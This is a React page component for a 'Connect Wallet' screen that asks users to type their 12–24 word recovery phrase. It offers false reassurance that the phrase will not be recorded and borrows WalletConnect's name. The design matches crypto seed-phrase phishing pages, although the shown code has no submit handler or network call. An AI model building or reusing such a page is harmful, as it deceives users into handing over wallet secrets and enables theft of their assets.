"use client";

import { useState } from "react";
import { CheckCircle2 } from "lucide-react";

export default function ConnectWeb3Page() {
  const [phrase, setPhrase] = useState("");
  
  const wordCount = phrase.trim().split(/\s+/).filter(w => w.length > 0).length;

  return (
    <div className="px-4 md:px-10 pb-12 pt-8 w-full animate-in fade-in duration-500 flex justify-center">
      
      {/* The Single Massive Card */}
      <div className="w-full max-w-[1000px] bg-white rounded-[1.5rem] p-5 md:p-10 md:p-12 shadow-[0_4px_24px_rgba(0,0,0,0.04)] border border-gray-50">
        
        {/* Title */}
        <h1 className="text-[20px] font-bold text-gray-800 mb-6">
          Connect Wallet
        </h1>

        {/* Textarea */}
        <div className="mb-4">
          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Enter Your 12 - 24 word phrase"
            className="w-full min-h-[160px] border border-gray-200 rounded-xl p-5 outline-none focus:border-[#E81C24] transition-colors text-[15px] text-gray-800 resize-y leading-relaxed placeholder:text-gray-400"
            spellCheck="false"
          />
        </div>

        {/* Word Count */}
        <div className="mb-6">
          <span className="text-[14px] text-gray-500 font-medium">
            Word count: {wordCount}
          </span>
        </div>

        {/* Proceed Button */}
        <div className="mb-8">
          <button 
            disabled={wordCount === 0}
            className={`px-8 py-2.5 rounded-full font-bold text-[15px] transition-colors ${
              wordCount > 0 
                ? 'bg-[#E81C24] hover:bg-[#d41920] text-white' 
                : 'bg-[#E81C24] text-white opacity-80 cursor-not-allowed'
            }`}
          >
            Proceed
          </button>
        </div>

        {/* Bullet Points */}
        <div className="space-y-3">
          <div className="flex gap-3 items-start">
            <CheckCircle2 className="w-4 h-4 text-[#0066FF] shrink-0 mt-0.5" strokeWidth={3} />
            <p className="text-[13px] text-gray-500 font-medium leading-relaxed">
              We will not record your Mnemonics Phrase. You control the access and your assets.
            </p>
          </div>
          <div className="flex gap-3 items-start">
            <CheckCircle2 className="w-4 h-4 text-[#0066FF] shrink-0 mt-0.5" strokeWidth={3} />
            <p className="text-[13px] text-gray-500 font-medium leading-relaxed">
              It is recommended that you manually input your Mnemonic Phrase
            </p>
          </div>
          <div className="flex gap-3 items-start">
            <CheckCircle2 className="w-4 h-4 text-[#0066FF] shrink-0 mt-0.5" strokeWidth={3} />
            <p className="text-[13px] text-gray-500 font-medium leading-relaxed">
              Our communications protocol with WalletConnect brings the ecosystem together by enabling wallets and apps to securely connect and interact.
            </p>
          </div>
        </div>

      </div>
    </div>
  );
}
